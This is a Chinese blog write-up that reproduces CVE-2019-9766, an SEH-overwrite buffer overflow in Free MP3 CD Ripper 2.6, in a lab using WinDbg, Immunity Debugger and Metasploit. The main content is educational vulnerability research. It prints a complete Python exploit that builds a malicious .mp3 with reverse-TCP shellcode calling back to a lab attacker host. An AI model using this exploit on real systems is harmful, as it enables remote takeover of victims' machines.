---
layout:     post
title:      CVE-2019-9766-Free MP3 CD Ripper缓冲区溢出漏洞调试分析
subtitle:   漏洞复现
date:       2020-08-12
author:     Jie_Y
header-img: img/post-bg-vulnerability.jpg
catalog: true
tags:
    - 漏洞逆向
    - 二进制
---

# CVE-2019-9766-Free MP3 CD缓冲区溢出漏洞调试分析

概述：`CVE-2019-9766`是一个软件类型的缓冲区溢出漏洞，涉及的软件是`Free MP3 CD Ripper`，可以构造`shellcode`使其覆盖`SEH`链造成缓冲区溢出漏洞。下面进行详细分析：

## 1 漏洞描述

`Free MP3 CD Ripper`是一款音频格式转换器，转换文件时，`Free MP3 CD Ripper 2.6`中基于堆栈的缓冲区溢出会导致用户协助的远程攻击者通过精心制作的.mp3文件执行任意代码。

漏洞公开：<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9766>

## 2 漏洞复现

### 2.1 调试环境

主机操作系统：`kali 19.04 64`位(IP地址：`192.168.1.12`)

![](https://i.loli.net/2020/08/12/xcGZeu5mh2nLP36.png)

![](https://i.loli.net/2020/08/12/wtNMUW6sxb1AqnC.png)

靶机操作系统：`Windows7 sp1 64`位(IP地址：`192.168.1.13`)

![](https://i.loli.net/2020/08/12/jwuXLPDsoS7dE8T.png)

![](https://i.loli.net/2020/08/12/EkbVpcxvPAWz2Sa.png)

对象版本：`Free MP3 CD Ripper v2.6`(https://free-mp3-cd-ripper.soft32.com/)

工 具：`WinDbg`、`Python`、`ImmunityDebugger`

### 2.2 复现结果

首先通过`python`代码生成`mp3`文件，将10000个字符`A`转换成`mp3`文件，代码如下：
```python
# Stack-based buffer overflow in Free MP3 CD Ripper 2.6

buffer = "A" * 4116

try:
f=open("TestFMCR-1.mp3","w")
print "[+] Creating %s bytes mp3 File..." %len(buffer)
f.write(buffer)
f.close()
print "[+] mp3 File created successfully!"
except:
print "File cannot be created!"
```
在`kali`系统里运行`FmcrExploit.py`，生成`FmcrExploit-1.mp3`文件：

![](https://i.loli.net/2020/08/12/JcRu48evxUMOSoZ.png)

将`FmcrExploit-1.mp3`文件在`win7`系统的`Free MP3 CD Ripper`软件打开，显示如下，说明存在错误。

![](https://i.loli.net/2020/08/12/pwuzRsU2NWbG4fc.png)

## 3 漏洞分析

### 3.1 配置环境

`Free MP3 CD Ripper 2.6`安装，由于是在`Windows`系统下安装，较为简单，直接默认安装即可。

### 3.2 漏洞验证

首先利用上面复现结果中的代码，生成`TestFMCR.mp3`文件，然后打开`Free MP3 CD Ripper`，再打开`WinDBG`，并将`WinDBG`附加到`Free MP3 CD Ripper`的进程`fcrip.exe`上：

![](https://i.loli.net/2020/08/12/9rXaoFQGpgvqDs2.png)

首先在`WinDBG`命令行中输入`g`运行程序，然后在`Free MP3 CD Ripper`中点击`Convert`，选中生成的`TestFMCR.mp3`进行转换，会看到程序发生了异常：

![](https://i.loli.net/2020/08/12/HJQI5NwCX9krbg6.png)

然后执行`!exchain`命令，查看`SEH`链信息：

![](https://i.loli.net/2020/08/12/pNTsgebQIzj5r2P.png)

说明10000个字符`A`已经成功覆盖`SEH`。

### 3.3 漏洞利用

首先定位程序的溢出点，判断需要多少个字符`A`才能覆盖`SEH`链。首先生成长度为10000且没有重复字符的文本：
```bash
root@user:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 10000
```
![](https://i.loli.net/2020/08/12/L9pJ3y8oQSBGUWR.png)

复制生成的文本，替换`FmcrExploit.py`中的10000个`A`，然后运行`python`文件，生成新的`TestFMCR-2.mp3`文件。

重复漏洞验证`WinDBG`附加进程运行的步骤，可以发现`Pointer to next record`被`0x46326846`覆盖：

![](https://i.loli.net/2020/08/12/XV4tLA3G1HqYOnb.png)

然后通过`0x46326846`定位程序溢出点，可以知道只要填充4116个字符即可覆盖到`Pointer to next SEH record`：

![](https://i.loli.net/2020/08/12/7T3DgXuhEeO2vUC.png)

然后将`FmcrExploit.py`中的`buffer`赋值为`“A”*4116`，验证上面得到的溢出点是否正确。运行`python`文件生成`TestFMCR-3.mp3`文件，拷贝到`Windows`系统下。

在`Windows`系统中打开`ImmunityDebugger`，运行`Free MP3 CD Ripper`，跟踪其进程，然后`convert`上面生成的`TestFMCR-3.mp3`文件：

![](https://i.loli.net/2020/08/12/TWGbx92K3HuhrXm.png)

可以看到4116个字符正好覆盖到了`Pointer to next SEH record`，定位成功。

`Pointer to next SEH record`（简称`NSEH`），指示下一个`SEH`结构的位置，这里使用`"\xeb\x06\x90\x90"`填充，这四字节反汇编的结果是`jmp 6、nop、nop`三条指令，`jmp 6`表示跳过6个字节，刚好跳过两个`nop`指令和一个4字节的`SEH`处理程序地址，然后落入`nop`指令区，滑行进入`shellcode`。结合`SEH`和`NSEH`，才能完成溢出攻击的全部过程。

![](https://i.loli.net/2020/08/12/kCAPdoHD1VnM9Kb.png)

然后寻找`pop pop ret`三条连续的指令，在`xp`中这个过程会简单很多，但是`win7`及更高版本的系统中加入了`safeseh`、`ASLR`等安全保护措施。可以在`ImmunityDebugger`中执行`!mona seh`命令：

![](https://i.loli.net/2020/08/12/foJFY4uEKAD9CZM.png)

`Seh.txt`存放在`C:\Users\User\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger`文件夹下，可以在其中找到一条信息：

![](https://i.loli.net/2020/08/12/bQOFN5CJYTBrmoV.png)

可以看到这个`pop pop ret`指令序列地址为`0x66e42084`，对应的是软件自带的`dll`文件(`C:\Program Files\Free MP3 CD Ripper\ogg.dll`)，注意不要使用系统自带的dll文件，可能会有`ASLR`、`SafeSEH`保护。由于大端小端问题，然后我们就可以在`shellcode.py`中给`SEH`赋值`"\x84\x20\xe4\x66"`。

然后我们可以利用`msf`定制一个反向`TCP`链接的`shellcode`：

![](https://i.loli.net/2020/08/12/8v7bRDsImq1JVzZ.png)

生成的`shellcode`为341个字节，需要考虑缓冲区的大小是否可以放入`shellcode`。根据`ImmunityDebugger`的调试结果，计算一下缓冲区大小：

![](https://i.loli.net/2020/08/12/tG3CbU1QAKH94ED.png)

![](https://i.loli.net/2020/08/12/bfSij1IUoRNvAnV.png)

`0x5ACFFFC-0x5ACFEC4=0x138`，转换为十进制是312，所以缓冲区大小为`312+4=316`字节，因此放不下341字节的`shellcode`。

对shellcode进行压缩：

![](https://i.loli.net/2020/08/12/vUdXCxGOoufMn87.png)

压缩后，`shellcode`大小为283字节。编写`shellcode.py`：
```python
# Stack-based buffer overflow in Free MP3 CD Ripper 2.6

buffer = "A"*4116
NSEH = "\xeb\x06\x90\x90"
SEH = "\x84\x20\xe4\x66"
nops = "\x90" * 5
buf = ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
buf += "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
buf += "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
buf += "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
buf += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
buf += "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
buf += "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
buf += "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
buf += "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
buf += "\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
buf += "\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x0c"
buf += "\x68\x02\x00\x22\xb8\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += "\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0"
buf += "\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8"
buf += "\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00"
buf += "\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += "\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3" 
pad = "B" * (316-len(nops)-len(buf))
payload = buffer + NSEH + SEH + nops + buf + pad
try:
    f = open("Test_FMCR.mp3","w")
    print "[+] Creating %s bytes mp3 File..." %len(payload)
    f.write(payload)
    f.close()
    print "[+] mp3 File created successfully!"
except:
    print "File cannot be created!"
```
根据`shellcode.py`生成`Test_FMCR.mp3`文件：

![](https://i.loli.net/2020/08/12/SgVmelcPG1Xnhpj.png)

打开`kali`的`msfconsole`：

![](https://i.loli.net/2020/08/12/CHcgedTPAQG9zM4.png)

使用`exploit/multi/handler`模块，设置`lhost`、`lport`、攻击载荷：

![](https://i.loli.net/2020/08/12/KG7wWbvaTfSOIsc.png)

开启监听，然后再目标主机`Windows`上运行`Free MP3 CD Ripper`，并`convert`生成的`Test-FMCR.mp3`文件。`meterpreter session`成功建立：

![](https://i.loli.net/2020/08/12/KdzencaBYWGZLrH.png)

执行`shell`：

![](https://i.loli.net/2020/08/12/LRfG1OJnMyWiPj3.png)

漏洞利用成功！！

## 4 总结

缓冲区溢出漏洞利用除了进行返回地址的覆盖，也可以构造精心准备的`shellcode`覆盖`SEH`链，绕过`SEH`异常处理机制。`CVE-2019-9766`即是通过覆盖`SEH`链来利用缓冲区溢出漏洞，对于二进制漏洞来说，掌握其栈地址的布局非常重要。学会分析栈地址空间，掌握系统保护机制的绕过方法，就能够利用常见二进制漏洞。

## 5 参考

1、https://www.freebuf.com/vuls/199191.html

2、https://www.freebuf.com/vuls/244584.html
